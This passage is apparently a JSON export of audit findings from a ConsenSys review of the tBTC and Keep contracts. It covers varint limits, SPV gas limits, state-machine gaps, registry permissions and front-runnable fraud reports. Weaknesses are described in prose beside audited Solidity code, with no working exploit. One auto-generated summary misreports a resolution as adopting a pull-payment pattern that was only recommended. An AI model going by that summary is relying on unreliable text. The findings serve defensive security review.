      "content": "#### Resolution\n\n\n\nThe client provided the following statement:\n\n\n\n> \n> Benchmarks and takeaways are being tracked in issue <https://github.com/keep-network/tbtc/issues/556>.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThere is no explicit restriction on the number of inputs and outputs a Bitcoin transaction can have - as long as the transaction fits into a block. The number of inputs and outputs in a transaction is denoted by a leading “varint” - a variable length integer. In `BTCUtils.validateVin` and `BTCUtils.validateVout`, the value of this varint is restricted to under `0xFD`, or 253:\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L404-L415**\n\n\n\n```\n/// @notice Checks that the vin passed up is properly formatted\n/// @dev Consider a vin with a valid vout in its scriptsig\n/// @param \\_vin Raw bytes length-prefixed input vector\n/// @return True if it represents a validly formatted vin\nfunction validateVin(bytes memory \\_vin) internal pure returns (bool) {\n    uint256 \\_offset = 1;\n    uint8 \\_nIns = uint8(\\_vin.slice(0, 1)[0]);\n\n    // Not valid if it says there are too many or no inputs\n    if (\\_nIns >= 0xfd || \\_nIns == 0) {\n        return false;\n    }\n\n```\nTransactions that include more than 252 inputs or outputs will not pass this validation, leading to some legitimate deposits being rejected by the tBTC system.\n\n\n#### Examples\n\n\nThe 252-item limit exists in a few forms throughout the system, outside of the aforementioned `BTCUtils.validateVin` and `BTCUtils.validateVout`:\n\n\n1. `BTCUtils.determineOutputLength`:\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L294-L303**\n\n\n\n```\n/// @notice Determines the length of an output\n/// @dev 5 types: WPKH, WSH, PKH, SH, and OP\\_RETURN\n/// @param \\_output The output\n/// @return The length indicated by the prefix, error if invalid length\nfunction determineOutputLength(bytes memory \\_output) internal pure returns (uint256) {\n    uint8 \\_len = uint8(\\_output.slice(8, 1)[0]);\n    require(\\_len < 0xfd, \"Multi-byte VarInts not supported\");\n\n    return \\_len + 8 + 1; // 8 byte value, 1 byte for \\_len itself\n}\n\n```\n2. `DepositUtils.findAndParseFundingOutput`:\n\n\n**tbtc/implementation/contracts/deposit/DepositUtils.sol:L150-L154**\n\n\n\n```\nfunction findAndParseFundingOutput(\n    DepositUtils.Deposit storage \\_d,\n    bytes memory \\_txOutputVector,\n    uint8 \\_fundingOutputIndex\n) public view returns (bytes8) {\n\n```\n3. `DepositUtils.validateAndParseFundingSPVProof`:\n\n\n**tbtc/implementation/contracts/deposit/DepositUtils.sol:L181-L191**\n\n\n\n```\nfunction validateAndParseFundingSPVProof(\n    DepositUtils.Deposit storage \\_d,\n    bytes4 \\_txVersion,\n    bytes memory \\_txInputVector,\n    bytes memory \\_txOutputVector,\n    bytes4 \\_txLocktime,\n    uint8 \\_fundingOutputIndex,\n    bytes memory \\_merkleProof,\n    uint256 \\_txIndexInBlock,\n    bytes memory \\_bitcoinHeaders\n) public view returns (bytes8 \\_valueBytes, bytes memory \\_utxoOutpoint){\n\n```\n4. `DepositFunding.provideFraudBTCFundingProof`:\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L213-L223**\n\n\n\n```\nfunction provideFraudBTCFundingProof(\n    DepositUtils.Deposit storage \\_d,\n    bytes4 \\_txVersion,\n    bytes memory \\_txInputVector,\n    bytes memory \\_txOutputVector,\n    bytes4 \\_txLocktime,\n    uint8 \\_fundingOutputIndex,\n    bytes memory \\_merkleProof,\n    uint256 \\_txIndexInBlock,\n    bytes memory \\_bitcoinHeaders\n) public returns (bool) {\n\n```\n5. `DepositFunding.provideBTCFundingProof`:\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L263-L273**\n\n\n\n```\nfunction provideBTCFundingProof(\n    DepositUtils.Deposit storage \\_d,\n    bytes4 \\_txVersion,\n    bytes memory \\_txInputVector,\n    bytes memory \\_txOutputVector,\n    bytes4 \\_txLocktime,\n    uint8 \\_fundingOutputIndex,\n    bytes memory \\_merkleProof,\n    uint256 \\_txIndexInBlock,\n    bytes memory \\_bitcoinHeaders\n) public returns (bool) {\n\n```\n6. `DepositLiquidation.provideSPVFraudProof`:\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L150-L160**\n\n\n\n```\nfunction provideSPVFraudProof(\n    DepositUtils.Deposit storage \\_d,\n    bytes4 \\_txVersion,\n    bytes memory \\_txInputVector,\n    bytes memory \\_txOutputVector,\n    bytes4 \\_txLocktime,\n    bytes memory \\_merkleProof,\n    uint256 \\_txIndexInBlock,\n    uint8 \\_targetInputIndex,\n    bytes memory \\_bitcoinHeaders\n) public {\n\n```\n#### Recommendation\n\n\nIncorporate varint parsing in `BTCUtils.validateVin` and `BTCUtils.validateVout`. Ensure that other components of the system reflect the removal of the 252-item limit.",
      "summary": "\nThis bug report concerns the tBTC system, which is used to deposit Bitcoin into a system. The issue is that transactions with more than 252 inputs or outputs are being rejected by the system, which is not allowing legitimate deposits.\n\nThe problem lies in the restriction of the value of a varint to under 0xFD, or 253, in two functions: `BTCUtils.validateVin` and `BTCUtils.validateVout`. This limit also exists in other components of the system, such as `BTCUtils.determineOutputLength`, `DepositUtils.findAndParseFundingOutput`, `DepositUtils.validateAndParseFundingSPVProof`, `DepositFunding.provideFraudBTCFundingProof`, `DepositFunding.provideBTCFundingProof`, and `DepositLiquidation.provideSPVFraudProof`.\n\nThe recommendation is to incorporate varint parsing in `BTCUtils.validateVin` and `BTCUtils.validateVout`, and ensure that other components of the system reflect the removal of the 252-item limit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13772",
      "title": "tbtc - Ethereum block gas limit imposes a fundamental limitation on SPV proofs ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nSPV fraud proofs were removed in [keep-network/tbtc#521](https://github.com/keep-network/tbtc/pull/521). Remember to continue exploring this limitation of the EVM with benchmarking and gas estimates in the tBTC UI.\n\n\n#### Description\n\n\nSeveral components of the tBTC system rely on SPV proofs to prove the existence of transactions on Bitcoin. Because an SPV proof must provide the entire Bitcoin transaction to the proving smart contract, the Ethereum block gas limit imposes an upper bound on the size of the transaction in question. Although an exact upper bound is subject to several variables, reasonable estimates show that even a moderately-sized Bitcoin transaction may not be able to be successfully validated on Ethereum.\n\n\nThis limitation is significant for two reasons:\n\n\n1. Depositors may deposit BTC to the signers by way of a legitimate Bitcoin transaction, only to find that this transaction is unable to be verified on Ethereum. Although the depositor in question was not acting maliciously, they may lose their deposit entirely.\n2. In case signers collude to spend a depositor’s BTC unprompted, the system allows depositors to prove a fraudulent spend occurred by way of SPV fraud proof. Given that signers can easily spend BTC with a transaction that is too large to validate by way of SPV proof, this method of fraud proof is unreliable at best. Deposit owners should instead prove fraud by using an ECDSA fraud proof, which operates on a hash of the signed message.\n\n\n#### Recommendation\n\n\nIt’s important that prospective depositors are able to guarantee that their deposit transaction will be verified successfully. To that end, efforts should be made to provide a deposit UI that checks whether or not a given transaction will be verified successfully before it is submitted. Several variables can affect transaction verification:\n\n\n* Current Ethereum block gas limits\n* Number of zero-bytes in the Bitcoin transaction in question\n* Size of the merkle proof needed to prove the transaction’s existence\n\n\nGiven that not all of these can be calculated before the transaction is submitted to the Bitcoin blockchain, calculations should attempt to provide a margin of error for the process. Additionally, users should be well-educated about the process, including how to perform a deposit with relatively low risk.\n\n\nUnderstanding the relative limitations of the EVM will help this process significantly. Consider benchmarking the gas cost of verifying Bitcoin transactions of various sizes.\n\n\nFinally, because SPV fraud proofs can be gamed by colluding signers, they should be removed from the system entirely. Deposit owners should always be directed towards ECDSA fraud proofs, as these require relatively fewer assumptions and stronger guarantees.",
      "summary": "\nThe tBTC system relies on SPV proofs to prove the existence of transactions on Bitcoin. However, the Ethereum block gas limit imposes an upper bound on the size of the transaction in question, meaning that even a moderately-sized Bitcoin transaction may not be able to be successfully validated on Ethereum. This limitation is significant because if a depositor deposits BTC to the signers by way of a legitimate Bitcoin transaction, they may lose their deposit entirely. Additionally, signers can easily spend BTC with a transaction that is too large to validate by way of SPV proof, making this method of fraud proof unreliable.\n\nTo guarantee that a deposit transaction will be verified successfully, it is recommended that efforts should be made to provide a deposit UI that checks whether or not a given transaction will be verified successfully before it is submitted. Additionally, users should be well-educated about the process, including how to perform a deposit with relatively low risk. Benchmarking the gas cost of verifying Bitcoin transactions of various sizes is also recommended. Finally, SPV fraud proofs should be removed from the system entirely and deposit owners should always be directed towards ECDSA fraud proofs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13771",
      "title": "tbtc - Funder loses payment to keep if signing group is not established in time  Pending",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was addressed with <https://github.com/keep-network/tbtc/issues/495> by refunding the cost of creating a new keep. We recommend using the pull instead of a push payment pattern to avoid that the funder can block the call.\n\n\nAdditionally, the client provided the following statement:\n\n\n\n> \n> The remaining push vs pull question is being tracked in <https://github.com/keep-network/tbtc/issues/551,> part of recommendation 2.7.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nTo create a new deposit, the funder has to pay for the creation of a keep. If establishing the keep does not succeed in time, fails or the signing group decides not to return a public key when `retrieveSignerPubkey` is called to transition from `awaiting_signer_setup` to `awaiting_btc_funding_proof` the signer setup fails. After a timeout of 3 hrs, anyone can force the deposit to transition from `awaiting_signer_setup` to `failed_setup` by calling `notifySignerSetupFailure`.\n\n\nThe funder had to provide payment for the keep but the signing group failed to establish. Payment for the keep is not returned even though one could assume that the signing group tried to play unfairly. The signing group might intentionally try to cause this scenario to interfere with the system.\n\n\n#### Examples\n\n\n* `retrieveSignerPubkey` fails if keep provided pubkey is empty or of an unexpected length\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L108-L127**\n\n\n\n```\n/// @notice we poll the Keep contract to retrieve our pubkey\n/// @dev We store the pubkey as 2 bytestrings, X and Y.\n/// @param \\_d deposit storage pointer\n/// @return True if successful, otherwise revert\nfunction retrieveSignerPubkey(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inAwaitingSignerSetup(), \"Not currently awaiting signer setup\");\n\n    bytes memory \\_publicKey = IBondedECDSAKeep(\\_d.keepAddress).getPublicKey();\n    require(\\_publicKey.length == 64, \"public key not set or not 64-bytes long\");\n\n    \\_d.signingGroupPubkeyX = \\_publicKey.slice(0, 32).toBytes32();\n    \\_d.signingGroupPubkeyY = \\_publicKey.slice(32, 32).toBytes32();\n    require(\\_d.signingGroupPubkeyY != bytes32(0) && \\_d.signingGroupPubkeyX != bytes32(0), \"Keep returned bad pubkey\");\n    \\_d.fundingProofTimerStart = block.timestamp;\n\n    \\_d.setAwaitingBTCFundingProof();\n    \\_d.logRegisteredPubkey(\n        \\_d.signingGroupPubkeyX,\n        \\_d.signingGroupPubkeyY);\n}\n\n```\n* `notifySignerSetupFailure` can be called by anyone after a timeout of 3hrs\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L93-L106**\n\n\n\n```\n/// @notice Anyone may notify the contract that signing group setup has timed out\n/// @dev We rely on the keep system punishes the signers in this case\n/// @param \\_d deposit storage pointer\nfunction notifySignerSetupFailure(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inAwaitingSignerSetup(), \"Not awaiting setup\");\n    require(\n        block.timestamp > \\_d.signingGroupRequestedAt + TBTCConstants.getSigningGroupFormationTimeout(),\n        \"Signing group formation timeout not yet elapsed\"\n    );\n    \\_d.setFailedSetup();\n    \\_d.logSetupFailed();\n\n    fundingTeardown(\\_d);\n}\n\n```\n#### Recommendation\n\n\nIt should be ensured that a keep group always establishes or otherwise the funder is refunded the fee for the keep.",
      "summary": "\nThis bug report is about an issue that occurs when a funder pays for the creation of a keep, but the signing group fails to establish the keep. If the keep is not established in time, fails, or the signing group does not provide a public key, the signer setup fails. After a timeout of three hours, anyone can force the deposit to transition from \"awaiting_signer_setup\" to \"failed_setup\" by calling \"notifySignerSetupFailure\". The funder is not refunded the cost of creating the keep, which could be an issue if the signing group is attempting to interfere with the system.\n\nThe issue was addressed with a pull payment pattern instead of a push payment pattern, so that the funder cannot block the call. Additionally, a statement was provided that the remaining push vs pull question is being tracked in a GitHub issue.\n\nTo avoid this issue, it is recommended that a keep group always establishes, or the funder is refunded the fee for the keep.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13770",
      "title": "tbtc - State transitions are not always enforced ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was addressed with <https://github.com/keep-network/tbtc/issues/494> and accepted by the client with the following statement. Deposits that are timed out can still be pushed to an active state.\n\n\n\n> \n> For 5.7 around state transitions, our stance (specifically for the upcoming release) is that a skipped state is acceptable as long as it does not result in data loss or incentive skew. Taken in turn, the listed examples:\n> \n> \n> * ‘A TDT holder can choose not to call out notifySignerSetupFailure hoping that the signing group still forms after the signer setup timeout passes.’ -> we consider this fine. If the TDT holder wishes to hold out hope, it is their choice. Signers should be incentivized to call `notifySignerSetupFailure` in case of actual failure to release their bond.\n> * ‘The deposit can be pushed to active state even after notifySignerSetupFailure, notifyFundingTimeout have passed but nobody called it out.’ -> again, we consider this fine. A deposit that is funded and proven past its timeout is still a valid deposit, since the two players in question (the depositor and the signing group) were willing to wait longer to complete the flow. The timeouts in question are largely a matter of allowing signers to release their bond in case there is an issue setting up the deposit.\n> * ‘Members of the signing group might decide to call notifyFraudFundingTimeout in a race to avoid late submissions for provideFraudBTCFundingProof to succeed in order to contain funds lost due to fraud.’ -> We are intending to change the mechanic here so that signers lose their whole bond in either case.\n> * ‘A malicious signing group observes BTC funding on the bitcoin chain in an attempt to commit fraud at the time the provideBTCFundingProof transition becomes available to front-run provideFundingECDSAFraudProof forcing the deposit into active state.’ -> this one is tough, and we’re working on changing the liquidation initiator reward so it is no longer a useful attack. In particular, we’re looking at the suggestion in 2.4 for this.\n> * ‘If oracle price slippage occurs for one block (flash-crash type of event) someone could call an undercollateralization transition.’ -> We are still investigating this possibility.\n> * ‘A deposit term expiration courtesy call can be exit in the rare case where \\_d.fundedAt + TBTCConstants.getDepositTerm() == block.timestamp’ -> Deposit term expiration courtsey calls should no longer apply; see [keep-network/[email protected]`6344892`](https://github.com/keep-network/tbtc/commit/634489236f56df1049d210c7002bac9af4d7067c) . Courtesy call after deposit term is identical to courtsey call pre-term.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nA deposit follows a complex state-machine that makes sure it is correctly funded before `TBTC` Tokens are minted. The deposit lifecycle starts with a set of states modeling a **funding** flow that - if successful - ultimately leads to the deposit being **active**, meaning that corresponding `TBTC` tokens exist for the deposits. A **redemption** flow allows to redeem `TBTC` for `BTC` and a **liquidation** flow handles fraud and abort conditions. Fraud cases in the **funding** flow are handled separately.\n\n\nState transitions from one deposit state to another require someone calling the corresponding transition method on the deposit and actually spend gas on it. The incentive to call a transition varies and is analyzed in more detail in the **security-specification section** of this report.\n\n\nThis issue assumes that participants are not always pushing forward through the state machine as soon as a new state becomes available, opening up the possibility of having multiple state transitions being a valid option for a deposit (e.g. pushing a deposit to active state even though a timeout should have been called on it).\n\n\n#### Examples\n\n\n##### A TDT holder can choose not to call out `notifySignerSetupFailure` hoping that the signing group still forms after the signer setup timeout passes.\n\n\n* there is no incentive for the TDT holder to terminate its own deposit after a timeout.\n* the deposit might end up never being in a final error state.\n* there is no incentive for the signing group to terminate the deposit.\n\n\nThis affects all states that can time out.\n\n\n##### The deposit can be pushed to active state even after `notifySignerSetupFailure`, `notifyFundingTimeout` have passed but nobody called it out.\n\n\nThere is no timeout check in `retrieveSignerPubkey`, `provideBTCFundingProof`.\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L108-L117**\n\n\n\n```\n/// @notice we poll the Keep contract to retrieve our pubkey\n/// @dev We store the pubkey as 2 bytestrings, X and Y.\n/// @param \\_d deposit storage pointer\n/// @return True if successful, otherwise revert\nfunction retrieveSignerPubkey(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inAwaitingSignerSetup(), \"Not currently awaiting signer setup\");\n\n    bytes memory \\_publicKey = IBondedECDSAKeep(\\_d.keepAddress).getPublicKey();\n    require(\\_publicKey.length == 64, \"public key not set or not 64-bytes long\");\n\n\n```\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L263-L278**\n\n\n\n```\nfunction provideBTCFundingProof(\n    DepositUtils.Deposit storage \\_d,\n    bytes4 \\_txVersion,\n    bytes memory \\_txInputVector,\n    bytes memory \\_txOutputVector,\n    bytes4 \\_txLocktime,\n    uint8 \\_fundingOutputIndex,\n    bytes memory \\_merkleProof,\n    uint256 \\_txIndexInBlock,\n    bytes memory \\_bitcoinHeaders\n) public returns (bool) {\n\n    require(\\_d.inAwaitingBTCFundingProof(), \"Not awaiting funding\");\n\n    bytes8 \\_valueBytes;\n    bytes memory  \\_utxoOutpoint;\n\n```\n##### Members of the signing group might decide to call `notifyFraudFundingTimeout` in a race to avoid late submissions for `provideFraudBTCFundingProof` to succeed in order to contain funds lost due to fraud.\n\n\nIt should be noted that even after the fraud funding timeout passed the TDT holder could `provideFraudBTCFundingProof` as it does not check for the timeout.\n\n\n##### A malicious signing group observes BTC funding on the bitcoin chain in an attempt to commit fraud at the time the `provideBTCFundingProof` transition becomes available to front-run `provideFundingECDSAFraudProof` forcing the deposit into **active** state.\n\n\n* The malicious users of the signing group can then try to report fraud, set themselves as `liquidationInitiator` to be awarded part of the signer bond (in addition to taking control of the BTC collateral).\n* The TDT holders fraud-proof can be front-run, see [issue 5.15](#tbtc---various-deposit-state-transitions-can-be-front-run-eg-fraud-proofs-timeouts)\n\n\n##### If oracle price slippage occurs for one block (flash-crash type of event) someone could call an undercollateralization transition.\n\n\n* For severe oracle errors deposits might be liquidated by calling `notifyUndercollateralizedLiquidation`. The TDT holder cannot exit liquidation in this case.\n* For non-severe under collateralization someone could call `notifyCourtesyCall` to impose extra effort on TDT holders to `exitCourtesyCall` deposits.\n\n\n##### A deposit term expiration courtesy call can be exit in the rare case where `_d.fundedAt + TBTCConstants.getDepositTerm() == block.timestamp`\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L289-L298**\n\n\n\n```\n/// @notice Goes from courtesy call to active\n/// @dev Only callable if collateral is sufficient and the deposit is not expiring\n/// @param \\_d deposit storage pointer\nfunction exitCourtesyCall(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inCourtesyCall(), \"Not currently in courtesy call\");\n    require(block.timestamp <= \\_d.fundedAt + TBTCConstants.getDepositTerm(), \"Deposit is expiring\");\n    require(getCollateralizationPercentage(\\_d) >= \\_d.undercollateralizedThresholdPercent, \"Deposit is still undercollateralized\");\n    \\_d.setActive();\n    \\_d.logExitedCourtesyCall();\n}\n\n```\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L318-L327**\n\n\n\n```\n/// @notice Notifies the contract that its term limit has been reached\n/// @dev This initiates a courtesy call\n/// @param \\_d deposit storage pointer\nfunction notifyDepositExpiryCourtesyCall(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inActive(), \"Deposit is not active\");\n    require(block.timestamp >= \\_d.fundedAt + TBTCConstants.getDepositTerm(), \"Deposit term not elapsed\");\n    \\_d.setCourtesyCall();\n    \\_d.logCourtesyCalled();\n    \\_d.courtesyCallInitiated = block.timestamp;\n}\n\n```\nAllow exiting the courtesy call only if the deposit is not expired: `block.timestamp < _d.fundedAt + TBTCConstants.getDepositTerm()`\n\n\n#### Recommendation\n\n\nEnsure that there are no competing interests between participants of the system to favor one transition over the other, causing race conditions, front-running opportunities or stale deposits that are not pushed to end-states.\n\n\nNote: Please find an analysis of incentives to call state transitions in the security section of this document.",
      "summary": "\nThe TBTC deposit follows a complex state-machine that makes sure it is correctly funded before TBTC Tokens are minted. The deposit lifecycle starts with a set of states modeling a funding flow that, if successful, leads to the deposit being active, meaning that corresponding TBTC tokens exist for the deposits. A redemption flow allows to redeem TBTC for BTC and a liquidation flow handles fraud and abort conditions. Fraud cases in the funding flow are handled separately.\n\nState transitions from one deposit state to another require someone calling the corresponding transition method on the deposit and actually spending gas on it. This issue assumes that participants are not always pushing forward through the state machine as soon as a new state becomes available, opening up the possibility of having multiple state transitions being a valid option for a deposit (e.g. pushing a deposit to active state even though a timeout should have been called on it).\n\nExamples include a TDT holder not calling out a notifySignerSetupFailure and the deposit still being pushed to an active state after a notifyFundingTimeout has passed. Members of the signing group might decide to call notifyFraudFundingTimeout in a race to avoid late submissions for provideFraudBTCFundingProof to succeed in order to contain funds lost due to fraud. A malicious signing group might observe BTC funding on the bitcoin chain in an attempt to commit fraud at the time the provideBTCFundingProof transition becomes available to front-run provideFundingECDSAFraudProof forcing the deposit into active state. If oracle price slippage occurs for one block (flash-crash type of event) someone could call an undercollateralization transition. A deposit term expiration courtesy call can be exit in the rare case where _d.fundedAt + TBTCConstants.getDepositTerm() == block.timestamp.\n\nThis issue was addressed with a statement that deposits that are timed out can still be pushed to an active state. There is no incentive for the TDT holder to terminate its own deposit after a timeout, the deposit might end up never being in a final error state, and there is no incentive for the signing group to terminate the deposit.\n\nThe recommendation is to ensure that there are no competing interests between participants of the system to favor one transition over the other, causing race conditions, front-running opportunities or stale deposits that are not pushed to end-states. An analysis of incentives to call state transitions can be",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13769",
      "title": "keep-core - operator contracts disabled via panic button can be re-enabled by RegistryKeeper ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed by <https://github.com/keep-network/keep-core/issues/1406> with changes from <https://github.com/keep-network/keep-core/pull/1463:>\n\n\n* the contract is now using enums instead of int literals\n* only new operator contracts can be approved\n* only approved contracts can be disabled\n* disabled contracts cannot be re-enabled\n* disabling an operator contract does not yield an event\n* changes take effect immediately\n\n\n\n\n#### Description\n\n\nThe Registry contract defines three administrative accounts: `Governance`, `registryKeeper`, and `panicButton`. All permissions are initially assigned to the deployer when the contract is created. The account acting like a super-admin, being allowed to re-assign administrative accounts - is `Governance`. `registryKeeper` is a lower privileged account maintaining the registry and `panicButton` is an emergency account that can disable operator contracts.\n\n\nThe [keep specification](http://docs.keep.network/random-beacon/#_roles_and_authorizations) states the following:\n\n\n\n> \n> Panic Button\n> The Panic Button can disable malicious or malfunctioning contracts that have been previously approved by the Registry Keeper. When a contract is disabled by the Panic Button, its status on the registry changes to reflect this, and it becomes ineligible to penalize operators. Contracts disabled by the Panic Button can not be reactivated. The Panic Button can be rekeyed by Governance.\n> \n> \n> \n\n\nIt is assumed that the permissions are `Governance` > `panicButton` > `registryKeeper`, meaning that `panicButton` should be able to overrule `registryKeeper`, while `registryKeeper` cannot overrule `panicButton`.\n\n\nWith the current implementation of the Registry the `registryKeeper` account can re-enable an operator contract that has previously been disabled by the `panicButton` account.\n\n\nWe would also like to note the following:\n\n\n* The contract should use enums instead of integer literals when working with contract states.\n* Changes to the contract take effect immediately, allowing an administrative account to selectively front-run calls to the Registry ACL and interfere with user activity.\n* The operator contract state can be set to the current value without raising an error.\n* The panic button can be called for operator contracts that are not yet active.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/Registry.sol:L67-L75**\n\n\n\n```\n\nfunction approveOperatorContract(address operatorContract) public onlyRegistryKeeper {\n    operatorContracts[operatorContract] = 1;\n}\n\nfunction disableOperatorContract(address operatorContract) public onlyPanicButton {\n    operatorContracts[operatorContract] = 2;\n}\n\n\n```\n#### Recommendation\n\n\nThe keep specification states:\n\n\n\n> \n> The Panic Button can be used to set the status of an APPROVED contract to DISABLED. Operator Contracts disabled with the Panic Button cannot be re-enabled, and disabled contracts may not punish operators nor be selected by service contracts to perform work.\n> \n> \n> \n\n\nAll three accounts are typically trusted. We recommend requiring the `Governance` or `paniceButton` accounts to reset the contract operator state before `registryKeeper` can change the state or disallow re-enabling of disabled operator contracts as stated in the specification.",
      "summary": "\nThis bug report is about the Registry contract, which defines three administrative accounts: Governance, registryKeeper, and panicButton. It is assumed that the permissions are Governance > panicButton > registryKeeper, meaning that panicButton should be able to overrule registryKeeper, while registryKeeper cannot overrule panicButton. However, with the current implementation of the Registry, the registryKeeper account can re-enable an operator contract that has previously been disabled by the panicButton account. \n\nThe keep specification states that the Panic Button can be used to set the status of an APPROVED contract to DISABLED and that disabled contracts may not punish operators nor be selected by service contracts to perform work. It also states that operator contracts disabled with the Panic Button cannot be re-enabled.\n\nThe resolution to this bug was addressed by a GitHub pull request which changed the contract to use enums instead of integer literals, only allow new operator contracts to be approved, ensure only approved contracts can be disabled, and prevent disabled contracts from being re-enabled. It also ensured that disabling an operator contract does not yield an event and that changes take effect immediately.\n\nThe recommendation is to require the Governance or paniceButton accounts to reset the contract operator state before registryKeeper can change the state or disallow re-enabling of disabled operator contracts as stated in the specification.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13768",
      "title": "keep-core - reportUnauthorizedSigning fraud proof is not bound to reporter and can be front-run ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-core/issues/1405> by binding the proof to `msg.sender`.\n\n\n#### Description\n\n\nAn attacker can monitor `reportUnauthorizedSigning()` for fraud reports and attempt to front-run the original call in an effort to be the first one reporting the fraud and be rewarded 5% of the total seized amount.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconOperator.sol:L742-L755**\n\n\n\n```\n/\\*\\*\n \\* @dev Reports unauthorized signing for the provided group. Must provide\n \\* a valid signature of the group address as a message. Successful signature\n \\* verification means the private key has been leaked and all group members\n \\* should be punished by seizing their tokens. The submitter of this proof is\n \\* rewarded with 5% of the total seized amount scaled by the reward adjustment\n \\* parameter and the rest 95% is burned.\n \\*/\nfunction reportUnauthorizedSigning(\n    uint256 groupIndex,\n    bytes memory signedGroupPubKey\n) public {\n    groups.reportUnauthorizedSigning(groupIndex, signedGroupPubKey, minimumStake);\n}\n\n```\n#### Recommendation\n\n\nRequire the reporter to include `msg.sender` in the signature proving the fraud or\nimplement a two-step commit/reveal scheme to counter front-running opportunities by forcing a reporter to secretly commit the fraud parameters in one block and reveal them in another.",
      "summary": "\nThis bug report concerns the function `reportUnauthorizedSigning()` in the contract `KeepRandomBeaconOperator.sol`. This function is used to report when a group's private key has been leaked, and the submitter of the proof is rewarded with 5% of the total seized amount. The bug is that an attacker can monitor this function for fraud reports and attempt to front-run the original call in order to be the first one reporting the fraud and be rewarded the 5%.\n\nThe bug was addressed by binding the proof to `msg.sender` in <https://github.com/keep-network/keep-core/issues/1405>. Additionally, it was recommended that the reporter should include `msg.sender` in the signature proving the fraud, or a two-step commit/reveal scheme should be implemented to counter front-running opportunities by forcing a reporter to secretly commit the fraud parameters in one block and reveal them in another.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13767",
      "title": "keep-core - reportRelayEntryTimeout creates an incentive for nodes to race for rewards potentially wasting gas and it creates an opportunity for front-running ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFollowing the discussion at <https://github.com/keep-network/keep-core/issues/1404> it was verified that the method throws as early as possible in an attempt to safe gas in case many nodes call out the timeout in the same block. The client is currently comfortable with this tradeoff. We would like to note that this issue cannot easily be addressed (e.g. allowing nodes to disable calling out timeouts impacts the security of the system; a commit/reveal proxy adds overhead and is unlikely to make the situation better as nodes are programmed to call out timeouts) and we therefore recommend to monitor the network for this scenario.\n\n\n#### Description\n\n\nThe incentive on `reportRelayEntryTimeout` for being rewarded with 5% of the seized amount creates an incentive to call the method but might also kick off a race for front-running this call. This method is being called from the keep node which is unlikely to adjust the gasPrice and might always lose the race against a front-running bot collecting rewards for all timeouts and fraud proofs ([issue 5.7](#keep-core---reportunauthorizedsigning-fraud-proof-is-not-bound-to-reporter-and-can-be-front-run))\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconOperator.sol:L600-L626**\n\n\n\n```\n/\\*\\*\n \\* @dev Function used to inform about the fact the currently ongoing\n \\* new relay entry generation operation timed out. As a result, the group\n \\* which was supposed to produce a new relay entry is immediately\n \\* terminated and a new group is selected to produce a new relay entry.\n \\* All members of the group are punished by seizing minimum stake of\n \\* their tokens. The submitter 